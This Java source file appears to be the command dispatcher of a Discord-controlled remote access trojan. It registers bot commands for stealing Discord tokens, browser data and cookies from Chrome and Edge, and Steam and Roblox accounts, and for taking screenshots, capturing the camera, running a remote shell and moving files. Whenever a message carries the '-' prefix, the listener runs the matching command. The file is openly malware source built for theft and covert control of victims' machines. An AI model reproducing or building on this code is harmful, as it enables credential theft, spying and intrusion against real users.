package me.vasler.listeners;

import me.vasler.command.Command;
import me.vasler.command.impl.*;
import me.vasler.command.impl.browsers.*;
import me.vasler.command.impl.token.TokenCommand;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class CommandListener
extends ListenerAdapter {
    public static CommandListener INSTANCE;
    public String prefix = "-";
    private final List<Command> commands = new ArrayList<>();

    public CommandListener() {
        this.getCommands().add(new HelpCommand());
        this.getCommands().add(new TokenCommand());
        this.getCommands().add(new ScreenshotCommand());
        this.getCommands().add(new ShellCommand());
        this.getCommands().add(new IpCommand());
        this.getCommands().add(new DownloadCommand());
        this.getCommands().add(new UploadCommand());
        this.getCommands().add(new CameraCommand());
        this.getCommands().add(new ChromeCommand());
        this.getCommands().add(new EdgeCommand());
        this.getCommands().add(new SteamCommand());
        this.getCommands().add(new InfoCommand());
        this.getCommands().add(new CookiesCommand());
        this.getCommands().add(new RobloxCommand());
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        Message message = event.getMessage();
        TextChannel channel = event.getChannel().asTextChannel();
        if (!message.getContentRaw().startsWith(this.prefix) || message.getAuthor().isBot()) {
            return;
        }
        String sub = message.getContentRaw().substring(1);
        String[] args = sub.split(" ");
        for (Command command : this.commands) {
            for (String name : command.getAlias()) {
                if (!args[0].equalsIgnoreCase(name)) continue;
                try {
                    command.run(args, channel);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }

    @Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
        super.onSlashCommandInteraction(event);
    }

    public List<Command> getCommands() {
        return this.commands;
    }
}

